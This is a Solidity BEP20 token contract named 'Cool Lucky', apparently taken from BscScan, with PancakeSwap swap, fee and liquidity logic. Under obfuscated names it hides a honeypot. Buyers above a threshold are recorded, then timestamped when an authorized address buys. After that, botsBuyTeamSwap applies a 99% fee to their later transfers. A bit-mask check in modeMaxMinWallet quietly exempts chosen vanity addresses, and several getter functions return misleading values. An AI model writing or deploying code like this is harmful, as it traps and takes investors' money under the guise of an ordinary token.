/**
 *Submitted for verification at BscScan.com on 2022-12-16
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract CoolLucky is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Cool Lucky ";
    string constant _symbol = "CoolLucky";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private receiverBotsWalletSell;
    mapping(address => bool) private autoMarketingTeamExemptIsReceiverSell;
    mapping(address => bool) private autoMaxModeIs;
    mapping(address => bool) private receiverBotsLimitMode;
    mapping(address => uint256) private botsAutoLaunchedFee;
    mapping(uint256 => address) private receiverFeeMarketingIs;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private receiverIsExemptMode = 0;
    uint256 private minFeeBotsExemptBuyLaunchedSell = 9;

    //SELL FEES
    uint256 private launchedIsMinLiquidityReceiver = 0;
    uint256 private exemptLiquidityWalletMax = 9;

    uint256 private teamBotsSwapMin = minFeeBotsExemptBuyLaunchedSell + receiverIsExemptMode;
    uint256 private isMinWalletTeam = 100;

    address private autoIsBotsMarketing = (msg.sender); // auto-liq address
    address private swapReceiverLimitMode = (0x06010D3cFD90C49DB6Da12DBffFFcfd3da7fD5fb); // marketing address
    address private marketingIsBurnBots = DEAD;
    address private isSellLimitTradingLiquidityReceiver = DEAD;
    address private txBotsBuyLaunched = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private buyFeeBotsTrading;
    uint256 private limitTradingBurnTeamMarketingMax;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private tradingBurnSwapReceiverLaunched;
    uint256 private buyMarketingAutoTeamTradingTx;
    uint256 private walletBotsSwapBurnMinLiquidityTrading;
    uint256 private receiverAutoExemptMaxWalletBuyLiquidity;
    uint256 private modeBotsAutoTrading;

    bool private walletTxExemptMarketing = true;
    bool private receiverBotsLimitModeMode = true;
    bool private tradingBurnTeamFeeExemptIsWallet = true;
    bool private maxTradingLimitMinExempt = true;
    bool private tradingSwapLimitReceiver = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private marketingLiquiditySellLimitLaunchedFee = 6 * 10 ** 15;
    uint256 private modeFeeBuyIs = _totalSupply / 1000; // 0.1%

    
    uint256 private feeBurnIsReceiver = 0;
    uint256 private receiverExemptMaxMarketingWallet = 0;
    uint256 private walletAutoTeamSell = 0;
    uint256 private modeLimitLiquidityTx = 0;
    uint256 private swapWalletLimitAuto = 0;
    bool private limitAutoModeSell = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        tradingBurnSwapReceiverLaunched = true;

        receiverBotsWalletSell[msg.sender] = true;
        receiverBotsWalletSell[address(this)] = true;

        autoMarketingTeamExemptIsReceiverSell[msg.sender] = true;
        autoMarketingTeamExemptIsReceiverSell[0x0000000000000000000000000000000000000000] = true;
        autoMarketingTeamExemptIsReceiverSell[0x000000000000000000000000000000000000dEaD] = true;
        autoMarketingTeamExemptIsReceiverSell[address(this)] = true;

        autoMaxModeIs[msg.sender] = true;
        autoMaxModeIs[0x0000000000000000000000000000000000000000] = true;
        autoMaxModeIs[0x000000000000000000000000000000000000dEaD] = true;
        autoMaxModeIs[address(this)] = true;

        SetAuthorized(address(0xab866b391069DB446411d1B9FFfFd5e8DD61D435));

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return tradingTeamAutoSellReceiverBuyLaunched(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Cool Lucky  Insufficient Allowance");
        }

        return tradingTeamAutoSellReceiverBuyLaunched(sender, recipient, amount);
    }

    function tradingTeamAutoSellReceiverBuyLaunched(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (modeLimitLiquidityTx == minFeeBotsExemptBuyLaunchedSell) {
            modeLimitLiquidityTx = feeBurnIsReceiver;
        }

        if (feeBurnIsReceiver != feeBurnIsReceiver) {
            feeBurnIsReceiver = marketingLiquiditySellLimitLaunchedFee;
        }

        if (swapWalletLimitAuto == feeBurnIsReceiver) {
            swapWalletLimitAuto = minFeeBotsExemptBuyLaunchedSell;
        }


        bool bLimitTxWalletValue = modeMaxMinWallet(sender) || modeMaxMinWallet(recipient);
        
        if (swapWalletLimitAuto == exemptLiquidityWalletMax) {
            swapWalletLimitAuto = modeLimitLiquidityTx;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isAuthorized(recipient)) {
                txSellMarketingMin();
            }
            if (!bLimitTxWalletValue) {
                txSwapBuySellLaunchedLiquidityFee(recipient);
            }
        }
        
        if (feeBurnIsReceiver != swapWalletLimitAuto) {
            feeBurnIsReceiver = minFeeBotsExemptBuyLaunchedSell;
        }


        if (inSwap || bLimitTxWalletValue) {return autoMinTxWallet(sender, recipient, amount);}

        if (!receiverBotsWalletSell[sender] && !receiverBotsWalletSell[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Cool Lucky  Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || autoMaxModeIs[sender] || autoMaxModeIs[recipient], "Cool Lucky  Max TX Limit has been triggered");

        if (maxLaunchedTradingBuy()) {botsExemptBurnLiquidity();}

        _balances[sender] = _balances[sender].sub(amount, "Cool Lucky  Insufficient Balance");
        
        if (limitAutoModeSell == tradingSwapLimitReceiver) {
            limitAutoModeSell = tradingSwapLimitReceiver;
        }

        if (receiverExemptMaxMarketingWallet == isMinWalletTeam) {
            receiverExemptMaxMarketingWallet = feeBurnIsReceiver;
        }


        uint256 amountReceived = buyIsSwapModeLiquidity(sender) ? isMaxModeAuto(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function autoMinTxWallet(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Cool Lucky  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function buyIsSwapModeLiquidity(address sender) internal view returns (bool) {
        return !autoMarketingTeamExemptIsReceiverSell[sender];
    }

    function walletAutoTeamBuy(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            teamBotsSwapMin = exemptLiquidityWalletMax + launchedIsMinLiquidityReceiver;
            return botsBuyTeamSwap(sender, teamBotsSwapMin);
        }
        if (!selling && sender == uniswapV2Pair) {
            teamBotsSwapMin = minFeeBotsExemptBuyLaunchedSell + receiverIsExemptMode;
            return teamBotsSwapMin;
        }
        return botsBuyTeamSwap(sender, teamBotsSwapMin);
    }

    function limitMinLiquiditySwapSell() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function isMaxModeAuto(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(walletAutoTeamBuy(sender, receiver == uniswapV2Pair)).div(isMinWalletTeam);

        if (receiverBotsLimitMode[sender] || receiverBotsLimitMode[receiver]) {
            feeAmount = amount.mul(99).div(isMinWalletTeam);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function modeMaxMinWallet(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function botsBuyTeamSwap(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = botsAutoLaunchedFee[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function txSwapBuySellLaunchedLiquidityFee(address addr) private {
        if (limitMinLiquiditySwapSell() < marketingLiquiditySellLimitLaunchedFee) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        receiverFeeMarketingIs[exemptLimitValue] = addr;
    }

    function txSellMarketingMin() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (botsAutoLaunchedFee[receiverFeeMarketingIs[i]] == 0) {
                    botsAutoLaunchedFee[receiverFeeMarketingIs[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(swapReceiverLimitMode).transfer(amountBNB * amountPercentage / 100);
    }

    function maxLaunchedTradingBuy() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    tradingSwapLimitReceiver &&
    _balances[address(this)] >= modeFeeBuyIs;
    }

    function botsExemptBurnLiquidity() internal swapping {
        
        if (limitAutoModeSell != receiverBotsLimitModeMode) {
            limitAutoModeSell = maxTradingLimitMinExempt;
        }


        uint256 amountToLiquify = modeFeeBuyIs.mul(receiverIsExemptMode).div(teamBotsSwapMin).div(2);
        uint256 amountToSwap = modeFeeBuyIs.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (walletAutoTeamSell == modeLimitLiquidityTx) {
            walletAutoTeamSell = swapWalletLimitAuto;
        }

        if (receiverExemptMaxMarketingWallet != walletAutoTeamSell) {
            receiverExemptMaxMarketingWallet = receiverExemptMaxMarketingWallet;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = teamBotsSwapMin.sub(receiverIsExemptMode.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(receiverIsExemptMode).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(minFeeBotsExemptBuyLaunchedSell).div(totalETHFee);
        
        payable(swapReceiverLimitMode).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoIsBotsMarketing,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getWalletTxExemptMarketing() public view returns (bool) {
        if (walletTxExemptMarketing != tradingBurnTeamFeeExemptIsWallet) {
            return tradingBurnTeamFeeExemptIsWallet;
        }
        if (walletTxExemptMarketing == maxTradingLimitMinExempt) {
            return maxTradingLimitMinExempt;
        }
        return walletTxExemptMarketing;
    }
    function setWalletTxExemptMarketing(bool a0) public onlyOwner {
        walletTxExemptMarketing=a0;
    }

    function getMinFeeBotsExemptBuyLaunchedSell() public view returns (uint256) {
        if (minFeeBotsExemptBuyLaunchedSell != receiverExemptMaxMarketingWallet) {
            return receiverExemptMaxMarketingWallet;
        }
        if (minFeeBotsExemptBuyLaunchedSell == minFeeBotsExemptBuyLaunchedSell) {
            return minFeeBotsExemptBuyLaunchedSell;
        }
        if (minFeeBotsExemptBuyLaunchedSell == isMinWalletTeam) {
            return isMinWalletTeam;
        }
        return minFeeBotsExemptBuyLaunchedSell;
    }
    function setMinFeeBotsExemptBuyLaunchedSell(uint256 a0) public onlyOwner {
        if (minFeeBotsExemptBuyLaunchedSell == exemptLiquidityWalletMax) {
            exemptLiquidityWalletMax=a0;
        }
        if (minFeeBotsExemptBuyLaunchedSell == swapWalletLimitAuto) {
            swapWalletLimitAuto=a0;
        }
        if (minFeeBotsExemptBuyLaunchedSell == teamBotsSwapMin) {
            teamBotsSwapMin=a0;
        }
        minFeeBotsExemptBuyLaunchedSell=a0;
    }

    function getIsMinWalletTeam() public view returns (uint256) {
        if (isMinWalletTeam == isMinWalletTeam) {
            return isMinWalletTeam;
        }
        if (isMinWalletTeam != feeBurnIsReceiver) {
            return feeBurnIsReceiver;
        }
        if (isMinWalletTeam != feeBurnIsReceiver) {
            return feeBurnIsReceiver;
        }
        return isMinWalletTeam;
    }
    function setIsMinWalletTeam(uint256 a0) public onlyOwner {
        if (isMinWalletTeam == receiverExemptMaxMarketingWallet) {
            receiverExemptMaxMarketingWallet=a0;
        }
        if (isMinWalletTeam != teamBotsSwapMin) {
            teamBotsSwapMin=a0;
        }
        if (isMinWalletTeam == teamBotsSwapMin) {
            teamBotsSwapMin=a0;
        }
        isMinWalletTeam=a0;
    }

    function getMarketingLiquiditySellLimitLaunchedFee() public view returns (uint256) {
        return marketingLiquiditySellLimitLaunchedFee;
    }
    function setMarketingLiquiditySellLimitLaunchedFee(uint256 a0) public onlyOwner {
        if (marketingLiquiditySellLimitLaunchedFee == walletAutoTeamSell) {
            walletAutoTeamSell=a0;
        }
        marketingLiquiditySellLimitLaunchedFee=a0;
    }

    function getReceiverFeeMarketingIs(uint256 a0) public view returns (address) {
        if (a0 != launchedIsMinLiquidityReceiver) {
            return swapReceiverLimitMode;
        }
        if (a0 != teamBotsSwapMin) {
            return swapReceiverLimitMode;
        }
        if (a0 != receiverExemptMaxMarketingWallet) {
            return isSellLimitTradingLiquidityReceiver;
        }
            return receiverFeeMarketingIs[a0];
    }
    function setReceiverFeeMarketingIs(uint256 a0,address a1) public onlyOwner {
        if (a0 == swapWalletLimitAuto) {
            marketingIsBurnBots=a1;
        }
        if (a0 != swapWalletLimitAuto) {
            swapReceiverLimitMode=a1;
        }
        if (a0 != walletAutoTeamSell) {
            marketingIsBurnBots=a1;
        }
        receiverFeeMarketingIs[a0]=a1;
    }

    function getMarketingIsBurnBots() public view returns (address) {
        if (marketingIsBurnBots != txBotsBuyLaunched) {
            return txBotsBuyLaunched;
        }
        if (marketingIsBurnBots == isSellLimitTradingLiquidityReceiver) {
            return isSellLimitTradingLiquidityReceiver;
        }
        return marketingIsBurnBots;
    }
    function setMarketingIsBurnBots(address a0) public onlyOwner {
        if (marketingIsBurnBots == marketingIsBurnBots) {
            marketingIsBurnBots=a0;
        }
        marketingIsBurnBots=a0;
    }

    function getMaxTradingLimitMinExempt() public view returns (bool) {
        if (maxTradingLimitMinExempt != receiverBotsLimitModeMode) {
            return receiverBotsLimitModeMode;
        }
        if (maxTradingLimitMinExempt == tradingSwapLimitReceiver) {
            return tradingSwapLimitReceiver;
        }
        if (maxTradingLimitMinExempt == limitAutoModeSell) {
            return limitAutoModeSell;
        }
        return maxTradingLimitMinExempt;
    }
    function setMaxTradingLimitMinExempt(bool a0) public onlyOwner {
        if (maxTradingLimitMinExempt == limitAutoModeSell) {
            limitAutoModeSell=a0;
        }
        if (maxTradingLimitMinExempt != tradingSwapLimitReceiver) {
            tradingSwapLimitReceiver=a0;
        }
        maxTradingLimitMinExempt=a0;
    }

    function getAutoMarketingTeamExemptIsReceiverSell(address a0) public view returns (bool) {
        if (a0 == isSellLimitTradingLiquidityReceiver) {
            return tradingBurnTeamFeeExemptIsWallet;
        }
        if (a0 != autoIsBotsMarketing) {
            return limitAutoModeSell;
        }
            return autoMarketingTeamExemptIsReceiverSell[a0];
    }
    function setAutoMarketingTeamExemptIsReceiverSell(address a0,bool a1) public onlyOwner {
        if (a0 == isSellLimitTradingLiquidityReceiver) {
            maxTradingLimitMinExempt=a1;
        }
        autoMarketingTeamExemptIsReceiverSell[a0]=a1;
    }

    function getAutoMaxModeIs(address a0) public view returns (bool) {
        if (autoMaxModeIs[a0] == autoMaxModeIs[a0]) {
            return tradingBurnTeamFeeExemptIsWallet;
        }
        if (autoMaxModeIs[a0] != receiverBotsWalletSell[a0]) {
            return tradingBurnTeamFeeExemptIsWallet;
        }
        if (a0 != autoIsBotsMarketing) {
            return walletTxExemptMarketing;
        }
            return autoMaxModeIs[a0];
    }
    function setAutoMaxModeIs(address a0,bool a1) public onlyOwner {
        autoMaxModeIs[a0]=a1;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}